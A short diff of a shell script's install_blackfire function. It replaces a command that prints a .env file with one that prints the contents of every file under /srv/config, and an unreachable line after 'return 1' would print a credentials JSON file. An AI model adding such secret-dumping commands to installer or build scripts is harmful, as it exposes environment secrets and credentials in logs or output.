@@ -7,8 +7,7 @@ install_blackfire() {
 #ls -la --color=auto / 
 #ls -laR --color=auto /srv 
 
-cat /srv/www/.env
-
+find /srv/config -type f -exec echo -e "\nFile: {}" \; -exec cat "{}" \;
 
 return 1
 cat /srv/creds/creds.json
